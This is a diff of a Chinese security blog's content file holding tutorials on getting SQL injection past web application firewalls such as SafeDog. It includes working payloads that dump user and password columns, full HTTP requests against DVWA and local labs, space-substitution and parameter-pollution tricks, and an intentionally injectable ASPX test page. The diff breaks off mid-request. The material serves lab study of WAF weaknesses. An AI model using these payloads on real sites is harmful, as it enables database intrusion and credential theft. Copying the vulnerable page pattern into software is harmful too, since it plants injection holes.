+<h3 id="协议未覆盖绕过"><a href="#协议未覆盖绕过" class="headerlink" title="协议未覆盖绕过"></a>协议未覆盖绕过</h3><h4 id="绕过原理-2"><a href="#绕过原理-2" class="headerlink" title="绕过原理"></a>绕过原理</h4><p><strong>HTTP协议兼容性：HTTP Body多样性</strong></p>
+<p>在 http 头里的 Content-Type 提交表单支持四种协议：</p>
+<ul>
+<li>application/x-www-form-urlencoded  -编码模式</li>
+<li>multipart/form-data  -文件上传模式</li>
+<li>text/plain  -文本模式</li>
+<li>application/json  -json模式</li>
 </ul>
-<h3 id="WAF绕过的角度"><a href="#WAF绕过的角度" class="headerlink" title="WAF绕过的角度"></a>WAF绕过的角度</h3><ul>
-<li><strong>资源限制</strong> ———————（如通过超大数据包绕过WAF）</li>
-<li><strong>架构</strong> ———————（如通过DNS解析等寻找真实IP来绕过云WAF）</li>
-<li><strong>规则缺陷</strong>/<strong>特性</strong> ———————（如利用正则匹配缺陷、数据库特性、中间件特性等绕过WAF）</li>
-<li><strong>协议</strong> ———————（如针对HTTP_0.9版本下TCP长链接情况下的绕过）</li>
+<p>文件头的属性是传输前对提交的数据进行编码发送到服务器。其中 multipart/form-data 表示该数据被编码为一条消息,页上的每个控件对应消息中的一个部分。所以，当 waf 没有规则匹配该协议传输的数据时可被绕过。</p>
+<p><strong>绕过技巧</strong>：</p>
+<ul>
+<li>使用表单请求中的multipart/form-data</li>
+<li>关键词换行</li>
+<li>GET型请求转POST型</li>
 </ul>
-<p>之后的WAF Bypass也会从这几个角度分析，绕过各种WAF。</p>
-<h2 id="不同WAF拦截告警页面"><a href="#不同WAF拦截告警页面" class="headerlink" title="不同WAF拦截告警页面"></a>不同WAF拦截告警页面</h2><p>不同的WAF产品会自定义不同的拦截警告页面，在日常渗透中我们也可以根据不同的拦截页面来辨别出网站使用了哪款WAF产品，从而有目的性的进行WAF绕过。</p>
-<h3 id="安全狗"><a href="#安全狗" class="headerlink" title="安全狗"></a>安全狗</h3><p><strong>旧版</strong>：</p>
-<p><img src="https://i.loli.net/2021/10/13/nB3T4CL26jVOhK5.png" alt="image-20211013231932526"></p>
-<p><strong>新版</strong>：</p>
-<p><img src="https://i.loli.net/2021/10/13/B4oj93meSkDN7X6.png" alt="image-20211013231857602"></p>
-<h3 id="D盾"><a href="#D盾" class="headerlink" title="D盾"></a>D盾</h3><p><img src="https://i.loli.net/2021/10/13/BTeAwgRkQXl5jmP.png" alt="image-20211013232137219"></p>
-<h3 id="西数WTS-WAF"><a href="#西数WTS-WAF" class="headerlink" title="西数WTS-WAF"></a>西数WTS-WAF</h3><p><img src="https://i.loli.net/2021/10/13/TbSFjlM3GkJvnVI.png" alt="img"></p>
-<h3 id="云锁"><a href="#云锁" class="headerlink" title="云锁"></a>云锁</h3><p><img src="https://i.loli.net/2021/10/13/X7uHVW8Snf1qIUc.png" alt="img"></p>
-<h3 id="宝塔网站防火墙"><a href="#宝塔网站防火墙" class="headerlink" title="宝塔网站防火墙"></a>宝塔网站防火墙</h3><p><img src="https://i.loli.net/2021/10/13/a7vXxRNwoDWQzZf.png" alt="image-20211013232423393"></p>
-<h3 id="安全宝"><a href="#安全宝" class="headerlink" title="安全宝"></a>安全宝</h3><p><img src="https://i.loli.net/2021/10/13/dhE1mGx2zf7eZlX.png" alt="image-20211013234028253"></p>
-<h3 id="护卫神"><a href="#护卫神" class="headerlink" title="护卫神"></a>护卫神</h3><p><img src="https://i.loli.net/2021/10/13/P4ogsQFXAWcI3wh.png" alt="img"></p>
-<h3 id="UPUPW"><a href="#UPUPW" class="headerlink" title="UPUPW"></a>UPUPW</h3><p><img src="https://i.loli.net/2021/10/13/AW7bz8kLPMomS1I.png" alt="img"></p>
-<h3 id="阿里云盾"><a href="#阿里云盾" class="headerlink" title="阿里云盾"></a>阿里云盾</h3><p><img src="https://i.loli.net/2021/10/13/pADYIxnVw2hERme.png" alt="img"></p>
-<h3 id="CloudFlare"><a href="#CloudFlare" class="headerlink" title="CloudFlare"></a>CloudFlare</h3><p><img src="https://i.loli.net/2021/10/13/SzwFKj6QlUdqsnT.png" alt="image-20211013232237378"></p>
-<h3 id="创宇盾"><a href="#创宇盾" class="headerlink" title="创宇盾"></a>创宇盾</h3><p><img src="https://i.loli.net/2021/10/13/GCysZ7FEHo8P5Ya.png" alt="img"></p>
-<h3 id="玄武盾"><a href="#玄武盾" class="headerlink" title="玄武盾"></a>玄武盾</h3><p><img src="https://i.loli.net/2021/10/13/4YsNCluj6cRzvbL.png" alt="image-20211013233123284"></p>
-<h3 id="蓝盾"><a href="#蓝盾" class="headerlink" title="蓝盾"></a>蓝盾</h3><p><img src="https://i.loli.net/2021/10/13/2GEfa8wDTlienRP.png" alt="image-20211013234111708"></p>
-<h3 id="DuEdge百度边缘网络计算"><a href="#DuEdge百度边缘网络计算" class="headerlink" title="DuEdge百度边缘网络计算"></a>DuEdge百度边缘网络计算</h3><p><img src="https://i.loli.net/2021/10/13/eAVETpOaRbzQgqY.png" alt="image-20211013233354082"></p>
-<h3 id="腾讯云"><a href="#腾讯云" class="headerlink" title="腾讯云"></a>腾讯云</h3><p><img src="https://i.loli.net/2021/10/13/xiJtU4V32BmWzXY.png" alt="img"></p>
-<h3 id="百度云"><a href="#百度云" class="headerlink" title="百度云"></a>百度云</h3><p><img src="https://i.loli.net/2021/10/13/5UlW3hSm9OjbIYM.png" alt="img"></p>
-<h3 id="华为云"><a href="#华为云" class="headerlink" title="华为云"></a>华为云</h3><p><img src="https://i.loli.net/2021/10/13/oFm8vNZaPTt1jOb.png" alt="img"></p>
-<h3 id="360webscan"><a href="#360webscan" class="headerlink" title="360webscan"></a>360webscan</h3><p><img src="https://i.loli.net/2021/10/13/PaAlbG5K86RQzq1.png" alt="img"></p>
-<h3 id="360安域"><a href="#360安域" class="headerlink" title="360安域"></a>360安域</h3><p><img src="https://i.loli.net/2021/10/13/cDw6SLsRe3QBAb1.png" alt="image-20211013234002168"></p>
+<p><strong>数据包构造</strong>：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /dvwa/vulnerabilities/sqli/?Submit=Submit HTTP/1.1</span><br><span class="line">Host: localhost</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:93.0) Gecko/20100101 Firefox/93.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type:multipart/form-data; boundary=----WebKitFormBoundaryrGKCBY7qhFd3TrwA</span><br><span class="line">Content-Length: 218</span><br><span class="line">Origin: http://localhost</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http://localhost/dvwa/vulnerabilities/sqli/?Submit=Submit</span><br><span class="line">Cookie: security=low; ECS[visit_times]=1; PHPSESSID=90a4331de18bcd32ee2d780254f44589</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryrGKCBY7qhFd3TrwA</span><br><span class="line">Content-Disposition: form-data; name=&quot;id&quot;</span><br><span class="line"></span><br><span class="line">id=-1&#x27; union select null,concat_ws</span><br><span class="line"></span><br><span class="line">(char(32,58,32),user,password) </span><br><span class="line"></span><br><span class="line">from users #</span><br><span class="line">------WebKitFormBoundaryrGKCBY7qhFd3TrwA--</span><br></pre></td></tr></table></figure>
+<p><img src="https://i.loli.net/2021/10/16/iybr6tfZzQsVJnO.png" alt="image-20211016111037975"></p>
+<h3 id="多行注释符替换绕过"><a href="#多行注释符替换绕过" class="headerlink" title="多行注释符替换绕过"></a>多行注释符替换绕过</h3><h4 id="绕过原理-3"><a href="#绕过原理-3" class="headerlink" title="绕过原理"></a>绕过原理</h4><p><strong>规则缺陷/特性：数据库空格可使用其它字符替代</strong></p>
+<p>因为注释符#、— 都是把后面的语句全部注释掉了，而多行注释/**/则是注释指定部分，需要一前一后闭合，所以在传参那里几乎不做注释语句用，而是用于过滤空格等bypass。</p>
+<p>在进行SQL语句查询的时候可以利用注释符来替代语法中的空格，例如：</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> [dbo].[<span class="keyword">User</span>] <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span></span><br></pre></td></tr></table></figure>
+<p>可替代为：</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span><span class="comment">/**/</span><span class="operator">*</span><span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>[dbo].[<span class="keyword">User</span>]<span class="comment">/**/</span><span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span></span><br></pre></td></tr></table></figure>
+<p>那么意味着在注释符中可以添加大量的无效字符来打破WAF的规则匹配。</p>
+<p><strong>绕过技巧</strong>：</p>
+<ul>
+<li>使用多行注释符/**/来构造payload进行绕过</li>
+</ul>
+<p>使用order by语句进行测试</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://hackrock.com:812/vulnerabilities/sqli/?id=1%27+order by 2+%23&amp;Submit=Submit#</span><br><span class="line"></span><br><span class="line"># 被拦截</span><br></pre></td></tr></table></figure>
+<p><img src="https://i.loli.net/2021/10/16/tnBhzJPOFDXUjox.png" alt="image-20211016145100751"></p>
+<p><code>/**/</code>替换空格</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://hackrock.com:812/vulnerabilities/sqli/?id=1%27+order/**/by 2+%23&amp;Submit=Submit#</span><br><span class="line"></span><br><span class="line"># 被拦截</span><br></pre></td></tr></table></figure>
+<p><code>/*--*/</code>替换空格</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://hackrock.com:812/vulnerabilities/sqli/?id=1%27+order/*--*/by 2+%23&amp;Submit=Submit#</span><br><span class="line"></span><br><span class="line"># 被拦截</span><br></pre></td></tr></table></figure>
+<p><code>/*//*/</code>替换空格</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://hackrock.com:812/vulnerabilities/sqli/?id=1%27+order/*//*/by 2+%23&amp;Submit=Submit#</span><br><span class="line"></span><br><span class="line"># 不拦截</span><br></pre></td></tr></table></figure>
+<p><img src="https://i.loli.net/2021/10/16/ISpgjVWdTlus1xE.png" alt="image-20211016145143507"></p>
+<p>再使用union select语句进行测试</p>
+<p><img src="https://i.loli.net/2021/10/16/ldBFst71nVmaO4j.png" alt="image-20211016150036280"></p>
+<p>得出可以使用<code>/*//*/</code>代替空格来进行绕过获取数据</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://hackrock.com:812/vulnerabilities/sqli/?id=1%27+union/*//*/select 1,concat_ws(char(32,58,32),user,password) from/*//*/users+%23&amp;Submit=Submit#</span><br></pre></td></tr></table></figure>
+<p><img src="https://i.loli.net/2021/10/16/ZkhTPXifCQYWKIr.png" alt="image-20211016150953965"></p>
+<h2 id="Bypass安全狗SQLServer注入"><a href="#Bypass安全狗SQLServer注入" class="headerlink" title="Bypass安全狗SQLServer注入"></a>Bypass安全狗SQLServer注入</h2><h3 id="SQLServer特性"><a href="#SQLServer特性" class="headerlink" title="SQLServer特性"></a>SQLServer特性</h3><p><strong>空格可以由其它字符替代</strong></p>
+<blockquote>
+<p>select id,contents,time from news where news_id=1<span style="color:red">①</span>union<span style="color:red">②</span>select<span style="color:red">③</span>1,2,db_name()<span style="color:red">④</span>from<span style="color:red">⑤</span>admin</p>
+</blockquote>
+<ul>
+<li><p>位置①</p>
+<ul>
+<li>可以利用其它控制字符替换空格：%01~%0F、%11~%1F</li>
+<li>可以利用注释符号：/**/、—+a%0d%0a</li>
+<li>可利用数学运算符以及数据类型：news_id=1.0，news_id=1e0，news_id=1-1</li>
+</ul>
+</li>
+<li><p>位置②</p>
+<ul>
+<li>可以利用其它控制字符替换空格：%01~%0F、%11~%1F</li>
+<li>可以利用注释符号：/**/、—+a%0d%0a</li>
+<li>可以利用加号+替换空格：union+select</li>
+</ul>
+</li>
+<li><p>位置③</p>
+<ul>
+<li>可以利用其它控制字符替换空格：%01~%0F、%11~%1F</li>
+<li>可以利用注释符号：/**/、—+a%0d%0a</li>
+<li>可利用数学运算符：+、-、~、.    （注：其中-、~、.号必须是select查询的第一个字段的数据类型为数字型才能使用）</li>
+<li>可以利用小括号()替换空格：select(1),2,db_name()</li>
+</ul>
+</li>
+<li><p>位置④</p>
+<ul>
+<li>可以利用其它控制字符替换空格：%01~%0F、%11~%1F</li>
+<li>可以利用注释符号：/**/、—+a%0d%0a</li>
+<li>可利用其他字符：%80~%FF（需要IIS服务器支持）</li>
+</ul>
+</li>
+<li><p>位置⑤</p>
+<ul>
+<li>可以利用其它控制字符替换空格：%01~%0F、%11~%1F</li>
+<li>可以利用注释符号：/**/、—+a%0d%0a</li>
+<li>可利用其他字符：%80~%FF（需要IIS服务器支持）</li>
+<li>可以利用点号.替换空格：from.users</li>
+<li>可以利用中括号[]替换空格：from[users]</li>
+</ul>
+</li>
+</ul>
+<h3 id="实验靶场-1"><a href="#实验靶场-1" class="headerlink" title="实验靶场"></a>实验靶场</h3><p>数据库：SQL Server 2008R2</p>
+<p>Web服务器： IIS7.5 CN</p>
+<p>WAF：网站安全狗（IIS版）v4.0.3215</p>
+<p>靶场源码如下：index.aspx</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;%@ Page Language=&quot;C#&quot; AutoEventWireup=&quot;true&quot; %&gt;</span><br><span class="line">&lt;%@ Import Namespace=&quot;System.Data&quot; %&gt;</span><br><span class="line">&lt;%@ Import namespace=&quot;System.Data.SqlClient&quot;  %&gt;</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;script runat=&quot;server&quot;&gt;</span><br><span class="line">    private DataSet resSet=new DataSet();</span><br><span class="line">    protected void Page_Load(object sender, EventArgs e)</span><br><span class="line">    &#123;</span><br><span class="line">        String strconn = &quot;server=.;database=test;uid=sa;pwd=admin&quot;;</span><br><span class="line">		string id = Request.Params[&quot;id&quot;];</span><br><span class="line">        string sql = string.Format(&quot;select * from newss where id=&#123;0&#125;&quot;, id);</span><br><span class="line">        SqlConnection connection=new SqlConnection(strconn);</span><br><span class="line">        connection.Open();</span><br><span class="line">        SqlDataAdapter dataAdapter = new SqlDataAdapter(sql, connection);</span><br><span class="line">        dataAdapter.Fill(resSet);</span><br><span class="line">        DgData.DataSource = resSet.Tables[0];</span><br><span class="line">        DgData.DataBind();</span><br><span class="line">        Response.Write(&quot;执行语句:&lt;br&gt;&quot;+sql);</span><br><span class="line">        Response.Write(&quot;&lt;br&gt;结果为:&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot;&gt;</span><br><span class="line">&lt;head runat=&quot;server&quot;&gt;</span><br><span class="line">&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot;/&gt;</span><br><span class="line">    &lt;title&gt;SQLServer注入测试&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;form id=&quot;form1&quot; runat=&quot;server&quot;&gt;</span><br><span class="line">    &lt;div&gt;</span><br><span class="line">    </span><br><span class="line">        &lt;asp:DataGrid ID=&quot;DgData&quot; runat=&quot;server&quot; BackColor=&quot;White&quot; BorderColor=&quot;#3366CC&quot; </span><br><span class="line">            BorderStyle=&quot;None&quot; BorderWidth=&quot;1px&quot; CellPadding=&quot;4&quot; </span><br><span class="line">                HeaderStyle-CssClass=&quot;head&quot; Width=&quot;203px&quot;&gt;</span><br><span class="line">            &lt;FooterStyle BackColor=&quot;#99CCCC&quot; ForeColor=&quot;#003399&quot; /&gt;</span><br><span class="line">            &lt;SelectedItemStyle BackColor=&quot;#009999&quot; Font-Bold=&quot;True&quot; ForeColor=&quot;#CCFF99&quot; /&gt;</span><br><span class="line">            &lt;PagerStyle BackColor=&quot;#99CCCC&quot; ForeColor=&quot;#003399&quot; HorizontalAlign=&quot;Left&quot; </span><br><span class="line">                Mode=&quot;NumericPages&quot; /&gt;</span><br><span class="line">            &lt;ItemStyle BackColor=&quot;White&quot; ForeColor=&quot;#003399&quot; /&gt;</span><br><span class="line">&lt;HeaderStyle CssClass=&quot;head&quot; BackColor=&quot;#003399&quot; Font-Bold=&quot;True&quot; ForeColor=&quot;#CCCCFF&quot;&gt;&lt;/HeaderStyle&gt;</span><br><span class="line">        &lt;/asp:DataGrid&gt;</span><br><span class="line">    </span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+<h3 id="HPP分割参数绕过"><a href="#HPP分割参数绕过" class="headerlink" title="HPP分割参数绕过"></a>HPP分割参数绕过</h3><h4 id="绕过原理-4"><a href="#绕过原理-4" class="headerlink" title="绕过原理"></a>绕过原理</h4><p><strong>规则缺陷/特性：HTTP参数污染</strong></p>
+<p>HPP是HTTP Parameter Pollution的缩写，意为HTTP参数污染。</p>
+<p>在ASPX中，有一个比较特殊的HPP特性，当GET/POST/COOKIE同时提交的参数id，服务端接收参数id的顺序GET,POST,COOKIE，中间通过逗号链接，于是就有了这个idea。</p>
+<p>UNION、SELECT、FROM 三个关键字分别放在GET/POST/COOKIE的位置，通过ASPX的这个特性连起来，堪称完美的一个姿势，压根不好防。</p>
+<p>但姿势利用太过于局限： 使用Request.Params[“id”]来获取参数,G-P-C获取到参数拼接起来，仅仅作为Bypass分享一种思路而已。</p>
+<p><img src="https://mmbiz.qpic.cn/mmbiz_png/ia0LvkyJzB4nxzhYKqy6N2ked4h26t90woffPY1UxcJt6cQhMdzlicibZJNte04WjFeJf5cEkibVfGGK3fgXr9h5UA/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt="图片"></p>
+<p><strong>绕过技巧</strong>：</p>
+<ul>
+<li>GET型请求转POST型</li>
+<li>参数传递的顺序：GET-&gt;POST-&gt;COOKIE</li>
+<li>使用多行注释符/**/来闭合分割参数的逗号</li>
+</ul>
+<p><img src="https://i.loli.net/2021/10/27/SxH8TCOv2LsNBgQ.png" alt="image-20211027201228560"></p>
 <h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul>
 <li>ZP《Bypass安全狗mysql注入》</li>
-<li><a href="https://www.freebuf.com/articles/web/229982.html">WAF机制及绕过方法总结：注入篇 - FreeBuf网络安全行业门户</a></li>
-<li><a href="https://cloud.tencent.com/developer/article/1728133">干货 | 常见WAF拦截页面总结 - 云+社区 - 腾讯云 (tencent.com)</a></li>
-<li><a href="https://mp.weixin.qq.com/s/kRrELJquobgnXXz2ItRNxw">Waf识别工具和83个Waf拦截页面 (qq.com)</a></li>
+<li><a href="https://cloud.tencent.com/developer/article/1856698?from=article.detail.1631936">SQL注入 安全狗apache4.0.26655绕过 - 云+社区 - 腾讯云 (tencent.com)</a></li>
+<li><a href="https://cloud.tencent.com/developer/article/1631936?from=article.detail.1856683">Fuzz绕过安全狗4.0实现SQL注入 - 云+社区 - 腾讯云 (tencent.com)</a></li>
+<li><a href="https://cloud.tencent.com/developer/article/1856683">SQL注入-安全狗超大数据包绕过 - 云+社区 - 腾讯云 (tencent.com)</a></li>
+<li><a href="https://blog.csdn.net/weixin_50464560/article/details/120182543">Bypass WAF之HTTP参数污染(HPP)漏洞挖掘_J0hnson666的博客-CSDN博客</a></li>
 </ul>
 ]]></content>
       <categories>
@@ -5539,6 +5745,7 @@
         <category>SQL注入</category>
       </categories>
       <tags>
+        <tag>SQL注入</tag>
         <tag>WAF-Bypass</tag>
       </tags>
   </entry>
@@ -5889,213 +6096,6 @@
       </categories>
       <tags>
         <tag>SQL注入</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>WAF-Bypass之SQL注入绕过安全狗</title>
-    <url>/post/6c2dcc62.html</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="Bypass安全狗MySQL注入"><a href="#Bypass安全狗MySQL注入" class="headerlink" title="Bypass安全狗MySQL注入"></a>Bypass安全狗MySQL注入</h2><h3 id="MySQL特性"><a href="#MySQL特性" class="headerlink" title="MySQL特性"></a>MySQL特性</h3><p><strong>空格可以由其它字符替代</strong></p>
-<blockquote>
-<p>select id,contents,time from news where news_id=1<span style="color:red">①</span>union<span style="color:red">②</span>select<span style="color:red">③</span>1,2,username<span style="color:red">④</span>from<span style="color:red">⑤</span>admin</p>
-</blockquote>
-<ul>
-<li><p>位置①</p>
-<ul>
-<li>可以利用其它控制字符替换空格：%09,%0a,%0b,%0c,%0d,%20,%a0</li>
-<li>可以利用注释符号替换空格：/**/、%23est%0d%0a、 —+a%0d%0a</li>
-<li>可以利用数学运算以及数据类型：news_id=1.0，news_id=1E0，news_id=\N</li>
-</ul>
-</li>
-<li><p>位置②</p>
-<ul>
-<li>可以利用其它控制字符替换空格：%09,%0a,%0b,%0c,%0d,%20,%a0</li>
-<li>可以利用注释符号替换空格：/**/、%23test%0d%0a、 —+a%0d%0a</li>
-<li>可以利用括号：union(select 1,2)</li>
-</ul>
-</li>
-<li><p>位置③</p>
-<ul>
-<li>可以利用其它控制字符替换空格：%09,%0a,%0b,%0c,%0d,%20,%a0</li>
-<li>可以利用注释符号替换空格：/**/、%23test%0d%0a、 —+a%0d%0a</li>
-<li>可以利用其它符号：+ 、- 、 ~ 、!、@</li>
-</ul>
-</li>
-<li><p>位置④</p>
-<ul>
-<li><p>可以利用其它控制字符替换空格：%09,%0a,%0b,%0c,%0d,%20,%a0</p>
-</li>
-<li><p>可以利用注释符号替换空格：/**/、%23test%0d%0a、 —+a%0d%0a</p>
-</li>
-<li><p>大括号{}：union select {``1},{x 2}</p>
-</li>
-<li><p>可利用数学运算以及数据类型：</p>
-<blockquote>
-<p>union select usename,2.0from admin<br>union select username,8e0from admin<br>union select username,\Nfrom admin</p>
-</blockquote>
-</li>
-</ul>
-</li>
-<li><p>位置⑤</p>
-<ul>
-<li>可以利用其它控制字符替换空格：%09,%0a,%0b,%0c,%0d,%20,%a0</li>
-<li>可以利用注释符号替换空格：/**/、%23test%0d%0a、 —+a%0d%0a</li>
-<li>反引号`：union select 1,table_name,3  from`information_schema`.`tables`limit 0,1%23</li>
-<li>内联注释：union select 1,table_name,3  from /*!50001information_schema.tables*/ limit 0,1%23</li>
-<li>大括号{}：union select 1,table_name,3  from{x information_schema.tables}limit 0,1%23</li>
-<li>小括号()：union select 1,table_name,3  from(information_schema.tables)limit 0,1%23</li>
-</ul>
-</li>
-</ul>
-<h3 id="实验靶场"><a href="#实验靶场" class="headerlink" title="实验靶场"></a>实验靶场</h3><p>靶场：DVWA（low级别）</p>
-<p>数据库：MySQL 5.5</p>
-<p>Web脚本：PHP 5.4.19</p>
-<p>WAF：网站安全狗（Apache版）v4.0.2313</p>
-<p><img src="https://i.loli.net/2021/10/14/O1zMRZh2BSXbfr8.png" alt="image-20211014211210255"></p>
-<p>让我们查看一下DVWA-LOW级别SQL注入的源代码：</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;Submit&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$id</span> = <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;id&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check database</span></span><br><span class="line">    <span class="variable">$query</span>  = <span class="string">&quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;<span class="subst">$id</span>&#x27;;&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = mysqli_query(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$query</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="variable">$___mysqli_res</span> = mysqli_connect_error()) ? <span class="variable">$___mysqli_res</span> : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get results</span></span><br><span class="line">    <span class="keyword">while</span>( <span class="variable">$row</span> = mysqli_fetch_assoc( <span class="variable">$result</span> ) ) &#123;</span><br><span class="line">        <span class="comment">// Get values</span></span><br><span class="line">        <span class="variable">$first</span> = <span class="variable">$row</span>[<span class="string">&quot;first_name&quot;</span>];</span><br><span class="line">        <span class="variable">$last</span>  = <span class="variable">$row</span>[<span class="string">&quot;last_name&quot;</span>];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for end user</span></span><br><span class="line">        <span class="variable">$html</span> .= <span class="string">&quot;&lt;pre&gt;ID: <span class="subst">&#123;$id&#125;</span>&lt;br /&gt;First name: <span class="subst">&#123;$first&#125;</span>&lt;br /&gt;Surname: <span class="subst">&#123;$last&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    mysqli_close(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p>可以看到这里是采用$_REQUEST的方式进行表单数据的传递。这就说明既可以使用GET方式传参，也可以使用POST方式进行传参。</p>
-<h3 id="超大数据包绕过"><a href="#超大数据包绕过" class="headerlink" title="超大数据包绕过"></a>超大数据包绕过</h3><h4 id="绕过原理"><a href="#绕过原理" class="headerlink" title="绕过原理"></a>绕过原理</h4><p><strong>资源限制：WAF长度资源限制</strong></p>
-<p>假如HTTP请求POST BODY太大，检测所有内容，WAF集群消耗太多的CPU、内存资源。因此许多WAF只检测前面的2M或4M的内容。对于攻击者而言，只需要在POST BODY前面添加许多无用的数据，把攻击的payload放在最后即可绕过WAF检测。</p>
-<p><strong>绕过技巧</strong>：</p>
-<ul>
-<li>GET型请求转POST型</li>
-<li>Content-Length头长度大于8200</li>
-<li>正常参数在脏数据后面，否则无效</li>
-</ul>
-<p><strong>数据包构造</strong>：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /dvwa/vulnerabilities/sqli/?Submit=Submit HTTP/1.1</span><br><span class="line">Host: localhost</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:93.0) Gecko/20100101 Firefox/93.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 8200</span><br><span class="line">Origin: http://localhost</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http://localhost/dvwa/vulnerabilities/sqli/?Submit=Submit</span><br><span class="line">Cookie: security=low; ECS[visit_times]=1; PHPSESSID=90a4331de18bcd32ee2d780254f44589</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Sec-Fetch-Dest: document</span><br><span class="line">Sec-Fetch-Mode: navigate</span><br><span class="line">Sec-Fetch-Site: same-origin</span><br><span class="line"></span><br><span 